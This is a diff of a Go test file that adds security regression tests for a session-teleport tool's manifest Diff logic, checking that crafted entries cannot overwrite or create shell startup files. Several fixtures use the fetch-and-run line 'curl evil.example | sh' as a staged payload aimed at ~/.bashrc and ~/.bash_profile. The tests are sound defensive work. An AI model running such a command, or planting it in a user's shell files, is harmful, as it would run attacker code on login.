@@ -9,6 +9,7 @@ import (
 
 	"github.com/google/go-cmp/cmp"
 
+	"github.com/mithro/go-claude-teleport/internal/job"
 	"github.com/mithro/go-claude-teleport/internal/session"
 )
 
@@ -32,7 +33,7 @@ func TestDiffStatuses(t *testing.T) {
 	os.MkdirAll(staging, 0o700)
 	m := destManifest(dest)
 
-	st, err := Diff(context.Background(), m, staging)
+	st, err := Diff(context.Background(), m, staging, hostPaths(dest))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -50,7 +51,7 @@ func TestDiffStatuses(t *testing.T) {
 	os.Symlink("target", m.Entries[3].Dst)
 	writeFile(t, StagedPath(staging, 1), "line1\nline2\n")
 	writeFile(t, StagedPath(staging, 2)+".part", "{")
-	st, err = Diff(context.Background(), m, staging)
+	st, err = Diff(context.Background(), m, staging, hostPaths(dest))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -68,7 +69,7 @@ func TestDiffStatuses(t *testing.T) {
 	// wrong-size staged copy -> staged-mismatch and removed
 	os.Remove(m.Entries[2].Dst)
 	writeFile(t, StagedPath(staging, 2), "{}}}")
-	st, _ = Diff(context.Background(), m, staging)
+	st, _ = Diff(context.Background(), m, staging, hostPaths(dest))
 	if st[2] != StagedMismatch {
 		t.Errorf("wrong-size staged = %s", st[2])
 	}
@@ -77,6 +78,47 @@ func TestDiffStatuses(t *testing.T) {
 	}
 	if diff := cmp.Diff([]int{2}, Need(m, st)); diff != "" {
 		t.Errorf("Need (-want +got):\n%s", diff)
+	}
+}
+
+// TestPendingExcludesFFCandidate pins the bug an orchestrator e2e test
+// (a re-teleport back to a host that already holds an older copy of this
+// session's own transcript) found: verifyTransfer/runTransfer used Need as
+// a "the transfer step is done" oracle, but Need deliberately keeps
+// listing an already-staged ff-candidate (its own doc comment: "so a
+// resend after a crash is never skipped") — so a fast-forward transfer
+// could never converge, forever reporting the just-received file "still
+// missing". Pending is the correct completeness check: it excludes
+// ff-candidate (and present-different-FFAllowed, and present/staged-same),
+// since all of those already have a correctly staged copy for the later
+// install step to use.
+func TestPendingExcludesFFCandidate(t *testing.T) {
+	dest := t.TempDir()
+	staging := filepath.Join(t.TempDir(), "staging")
+	m := destManifest(dest)
+	writeFile(t, m.Entries[1].Dst, "line1\n")              // older copy of the FFAllowed transcript
+	writeFile(t, StagedPath(staging, 1), "line1\nline2\n") // the just-received, longer copy
+	st, err := Diff(context.Background(), m, staging, hostPaths(dest))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if st[1] != FFCandidate {
+		t.Fatalf("entry 1 = %s, want ff-candidate", st[1])
+	}
+	if got := Need(m, st); len(got) == 0 || got[0] != 1 {
+		t.Fatalf("Need = %v, want it to still list the ff-candidate (over-inclusive by design)", got)
+	}
+	pending := Pending(m, st)
+	for _, id := range pending {
+		if id == 1 {
+			t.Fatalf("Pending = %v, must not list an already-staged ff-candidate", pending)
+		}
+	}
+	// entry 0 (the project dir) exists as a side effect of writeFile
+	// MkdirAll-ing entry 1's parent -> present-same, not pending. Entries 2
+	// (other.json) and 3 (symlink) are genuinely absent -> still pending.
+	if diff := cmp.Diff([]int{2, 3}, pending); diff != "" {
+		t.Errorf("Pending (-want +got):\n%s", diff)
 	}
 }
 
@@ -91,7 +133,7 @@ func TestDiffFastForwardAndCollision(t *testing.T) {
 	// present-different regardless of size.
 	writeFile(t, m.Entries[1].Dst, "line1\n")
 	writeFile(t, m.Entries[2].Dst, "[]") // same size, different content -> present-different
-	st, err := Diff(context.Background(), m, staging)
+	st, err := Diff(context.Background(), m, staging, hostPaths(dest))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -111,7 +153,7 @@ func TestDiffFastForwardAndCollision(t *testing.T) {
 	// once staged, the prefix check is exact: a non-prefix becomes present-different
 	writeFile(t, StagedPath(staging, 1), "line1\nline2\n")
 	writeFile(t, m.Entries[1].Dst, "lineX\n")
-	st, _ = Diff(context.Background(), m, staging)
+	st, _ = Diff(context.Background(), m, staging, hostPaths(dest))
 	if st[1] != PresentDifferent {
 		t.Errorf("non-prefix same-session transcript = %s, want present-different", st[1])
 	}
@@ -129,10 +171,12 @@ func TestDiffFastForwardAndCollision(t *testing.T) {
 		t.Errorf("Need with forced present-different (-want +got):\n%s", diff)
 	}
 
-	// dir vs file collision
-	writeFile(t, filepath.Join(dest, "x"), "")
-	m.Entries[0].Dst = filepath.Join(dest, "x")
-	st, _ = Diff(context.Background(), m, staging)
+	// dir vs file collision (inside the config dir: a session entry
+	// outside it is refused outright, which is a different verdict —
+	// see TestDiffRefusalNamesTheEntryAndReason)
+	writeFile(t, filepath.Join(dest, ".claude", "x"), "")
+	m.Entries[0].Dst = filepath.Join(dest, ".claude", "x")
+	st, _ = Diff(context.Background(), m, staging, hostPaths(dest))
 	if st[0] != PresentDifferent {
 		t.Errorf("file where dir expected = %s", st[0])
 	}
@@ -159,7 +203,7 @@ func TestDiffFFCandidateRecordReflow(t *testing.T) {
 	writeFile(t, m.Entries[0].Dst, reflowed)
 	writeFile(t, StagedPath(staging, 0), full)
 
-	st, err := Diff(context.Background(), m, staging)
+	st, err := Diff(context.Background(), m, staging, hostPaths(dest))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -181,7 +225,7 @@ func TestDiffPropagatesNonENOENTStagedErrors(t *testing.T) {
 	staging := t.TempDir()
 	m := &Manifest{Version: 1, JobID: sid, SessionID: sid}
 	m.Entries = []Entry{
-		{ID: 0, Category: session.CatSession, Dst: filepath.Join(dest, "link"), Mode: uint32(os.ModeSymlink | 0o777), Symlink: "target"},
+		{ID: 0, Category: session.CatSession, Dst: filepath.Join(dest, ".claude", "link"), Mode: uint32(os.ModeSymlink | 0o777), Symlink: "target"},
 	}
 	staged := StagedPath(staging, 0) + ".symlink"
 	writeFile(t, staged, "target")
@@ -190,11 +234,223 @@ func TestDiffPropagatesNonENOENTStagedErrors(t *testing.T) {
 	}
 	defer os.Chmod(staged, 0o600) // best-effort: let TempDir cleanup remove it either way
 
-	_, err := Diff(context.Background(), m, staging)
+	_, err := Diff(context.Background(), m, staging, hostPaths(dest))
 	if err == nil {
 		t.Fatal("Diff must propagate a non-ENOENT staged-symlink read error, not swallow it")
 	}
 	if !strings.Contains(err.Error(), staged) {
 		t.Errorf("error must name the path %s: %v", staged, err)
+	}
+}
+
+// TestDiffHonoursDeferredOnlyForItsOwnCategories is the destination-side
+// half of the B1 security fix. Entry.Deferred arrives over the wire from
+// the SOURCE, and it makes Diff skip the Lstat of Dst entirely; a hostile
+// or buggy source could therefore mark an arbitrary destination path
+// (~/.bashrc) deferred, get staged-same back, and have Install overwrite
+// it. Deferred is meaningful for exactly three categories — the pane
+// capture (CatCapture) and existing-main git-attach's own index/worktree
+// entries (CatRepo/CatWorktree) — so for anything else the destination
+// must ignore the flag and compare against Dst as usual.
+//
+// CatCapture gets an extra guard on top (ruling R-P3-B1b, fixed here after
+// the wave B re-review found the residual hole this test originally
+// pinned): a Deferred CatCapture entry is ONLY ever exempt from the Dst
+// compare when Dst is the job's own canonical capture path, re-derived by
+// the destination itself. Here Dst is ~/.bashrc, which is never that path
+// for any staging dir/job id pair, so the capture entry must be refused
+// exactly like the non-deferrable pack entry, not treated as staged-same.
+func TestDiffHonoursDeferredOnlyForItsOwnCategories(t *testing.T) {
+	home := t.TempDir()
+	staging := filepath.Join(t.TempDir(), "staging")
+	if err := os.MkdirAll(staging, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	bashrc := filepath.Join(home, ".bashrc")
+	writeFile(t, bashrc, "# the user's own shell rc\n")
+	payload := "curl evil.example | sh\n"
+
+	m := &Manifest{Version: 1, JobID: sid, SessionID: sid}
+	for i, cat := range []session.Category{session.CatPack, session.CatCapture, session.CatRepo, session.CatWorktree} {
+		m.Entries = append(m.Entries, Entry{
+			ID: i, Category: cat, Dst: bashrc, Size: int64(len(payload)),
+			Mode: 0o600, SHA256: sha(payload), Deferred: true,
+		})
+		writeFile(t, StagedPath(staging, i), payload)
+	}
+
+	// Ruling R-P3-B1e: the pack entry (category outside the allow-list)
+	// and the rogue capture entry (not this job's canonical capture path)
+	// are REFUSALS, not statuses — the whole manifest is refused, naming
+	// both entries and their reasons, so preflight reports them as
+	// refusals rather than as content collisions.
+	_, err := Diff(context.Background(), m, staging, hostPaths(home))
+	if diff := cmp.Diff([]int{0, 1}, refusedIDs(t, err)); diff != "" {
+		t.Errorf("refused ids (-want +got):\n%s\nerr = %v", diff, err)
+	}
+	// The two categories Deferred IS meaningful for (existing-main's dirty
+	// index/worktree entries, which git-attach applies itself and Install
+	// never sees) are still classified by staging state alone.
+	gitOnly := &Manifest{Version: 1, JobID: m.JobID, SessionID: sid, Entries: m.Entries[2:]}
+	st, err := Diff(context.Background(), gitOnly, staging, hostPaths(home))
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, id := range []int{2, 3} {
+		if st[id] != StagedSame {
+			t.Errorf("deferred %s entry = %s, want %s", m.Entries[id].Category, st[id], StagedSame)
+		}
+	}
+	if blk := Blocking(gitOnly, st, false); len(blk) != 0 {
+		t.Errorf("Blocking = %+v, want none", blk)
+	}
+	if got, _ := os.ReadFile(bashrc); string(got) != "# the user's own shell rc\n" {
+		t.Errorf("Diff must not touch %s; content = %q", bashrc, got)
+	}
+}
+
+// TestDiffRefusesPackEntryWithAbsentTarget is the wave-B re-review's PoC
+// for ruling R-P3-B1c: TestDiffHonoursDeferredOnlyForItsOwnCategories above
+// only exercises a pack entry against an EXISTING destination file, where
+// the ordinary Lstat path already produces present-different for free (any
+// mismatch does). The actual residual hole never needed Deferred at all —
+// a pack entry whose Dst is ABSENT on the destination (e.g.
+// $HOME/.bash_profile, never written before) falls through Diff's ordinary
+// "not exist" branch to stagedStatus(), which returns staged-same purely
+// because bytes happen to be staged under that id, regardless of category.
+// placeEntry would then create the file from attacker-controlled bytes
+// (the reviewer's code-exec-on-next-login scenario). No FileEntry in this
+// codebase is ever built with CatPack (the git pack itself travels as the
+// separate StreamPack, straight into gitx.Attach, never as a manifest
+// entry) — so it is refused unconditionally, before any Lstat/staging
+// check, regardless of Deferred or whether Dst already exists.
+func TestDiffRefusesPackEntryWithAbsentTarget(t *testing.T) {
+	home := t.TempDir()
+	staging := filepath.Join(t.TempDir(), "staging")
+	if err := os.MkdirAll(staging, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	target := filepath.Join(home, ".bash_profile") // never written: absent on the destination
+	payload := "curl evil.example | sh\n"
+
+	m := &Manifest{Version: 1, JobID: sid, SessionID: sid}
+	m.Entries = []Entry{{
+		ID: 0, Category: session.CatPack, Dst: target,
+		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload),
+	}}
+	writeFile(t, StagedPath(staging, 0), payload)
+
+	_, err := Diff(context.Background(), m, staging, hostPaths(home))
+	if diff := cmp.Diff([]int{0}, refusedIDs(t, err)); diff != "" {
+		t.Errorf("refused ids (-want +got):\n%s\nerr = %v", diff, err)
+	}
+	if !strings.Contains(err.Error(), target) {
+		t.Errorf("refusal must name the entry: %v", err)
+	}
+	if _, err := os.Lstat(target); !os.IsNotExist(err) {
+		t.Errorf("Diff must never create %s: lstat err = %v", target, err)
+	}
+}
+
+// TestDiffRefusesCaptureDstRegardlessOfDeferred is the Diff half of ruling
+// R-P3-B1b, run with a REAL job.StagingDir(dataDir, jobID) staging
+// directory (the shape every production caller — internal/remote/local.go —
+// actually uses), so dataDirFromStagingDir recovers the real dataDir and
+// canonicalCaptureDst can be computed for real. A CatCapture entry whose
+// Dst is not that canonical path must be classified present-different
+// (never staged-same, never absent) whether or not Deferred is set — the
+// vulnerable case was Deferred, but the destination must not rely on the
+// source ever setting the flag honestly.
+func TestDiffRefusesCaptureDstRegardlessOfDeferred(t *testing.T) {
+	for _, deferred := range []bool{true, false} {
+		t.Run(map[bool]string{true: "deferred", false: "not deferred"}[deferred], func(t *testing.T) {
+			home := t.TempDir()
+			dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
+			jobID := "11111111-1111-4111-8111-111111111111"
+			staging := job.StagingDir(dataDir, jobID)
+			if err := os.MkdirAll(staging, 0o700); err != nil {
+				t.Fatal(err)
+			}
+			bashrc := filepath.Join(home, ".bashrc")
+			writeFile(t, bashrc, "# the user's own shell rc\n")
+			payload := "curl evil.example | sh\n"
+
+			m := &Manifest{Version: 1, JobID: jobID, SessionID: sid}
+			m.Entries = []Entry{{
+				ID: 0, Category: session.CatCapture, Dst: bashrc,
+				Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload),
+				Deferred: deferred,
+			}}
+			writeFile(t, StagedPath(staging, 0), payload)
+
+			_, err := Diff(context.Background(), m, staging, hostPaths(home))
+			if diff := cmp.Diff([]int{0}, refusedIDs(t, err)); diff != "" {
+				t.Errorf("refused ids (deferred=%v) (-want +got):\n%s\nerr = %v", deferred, diff, err)
+			}
+			if !strings.Contains(err.Error(), bashrc) {
+				t.Errorf("refusal must name the entry: %v", err)
+			}
+			if got, _ := os.ReadFile(bashrc); string(got) != "# the user's own shell rc\n" {
+				t.Errorf("Diff must not touch %s; content = %q", bashrc, got)
+			}
+		})
+	}
+}
+
+// TestBlockingNeverExemptsCaptureUnderForce covers ruling R-P3-B1c's minor
+// 5: Blocking's force+FFAllowed exemption (spec §7.3, session transcripts
+// only) blindly trusted e.FFAllowed, a SOURCE-computed wire field — nothing
+// stopped a hostile or buggy source from also setting FFAllowed:true on a
+// CatCapture entry. That entry is already forced present-different by
+// canonicalCaptureDst's check above, so Blocking must keep reporting it as
+// blocking even with force:true and FFAllowed:true; only a genuine
+// CatSession entry may ever be exempted.
+func TestBlockingNeverExemptsCaptureUnderForce(t *testing.T) {
+	m := &Manifest{Version: 1, JobID: sid, SessionID: sid}
+	m.Entries = []Entry{{ID: 0, Category: session.CatCapture, Dst: "/home/bob/.bashrc", FFAllowed: true}}
+	st := map[int]Status{0: PresentDifferent}
+	blk := Blocking(m, st, true)
+	if len(blk) != 1 || blk[0].ID != 0 {
+		t.Errorf("Blocking(force=true) = %+v, want the capture entry still blocked (never exempted)", blk)
+	}
+}
+
+// TestDiffAllowsCanonicalCaptureEntry proves the fix does not break the
+// legitimate case: a CatCapture entry whose Dst IS
+// job.Dir(dataDir, jobID)/capture.txt (the path
+// internal/orchestrate/steps.go's runCapture actually builds) is still
+// classified staged-same via the Deferred, staging-only comparison, exactly
+// as before this fix.
+func TestDiffAllowsCanonicalCaptureEntry(t *testing.T) {
+	home := t.TempDir()
+	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
+	jobID := "33333333-3333-4333-8333-333333333333"
+	staging := job.StagingDir(dataDir, jobID)
+	if err := os.MkdirAll(staging, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	capDst := filepath.Join(job.Dir(dataDir, jobID), "capture.txt")
+	// The destination's own prior capture snapshot, left over from an
+	// earlier attempt — Deferred means this difference is expected and
+	// must not block or be compared against.
+	writeFile(t, capDst, "stale snapshot from an earlier pass\n")
+	payload := "$ claude\n> hello\n"
+
+	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid}
+	m.Entries = []Entry{{
+		ID: 0, Category: session.CatCapture, Dst: capDst,
+		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload), Deferred: true,
+	}}
+	writeFile(t, StagedPath(staging, 0), payload)
+
+	st, err := Diff(context.Background(), m, staging, hostPaths(home))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if st[0] != StagedSame {
+		t.Errorf("canonical capture entry = %s, want %s", st[0], StagedSame)
+	}
+	if blk := Blocking(m, st, false); len(blk) != 0 {
+		t.Errorf("Blocking = %+v, want none", blk)
 	}
 }
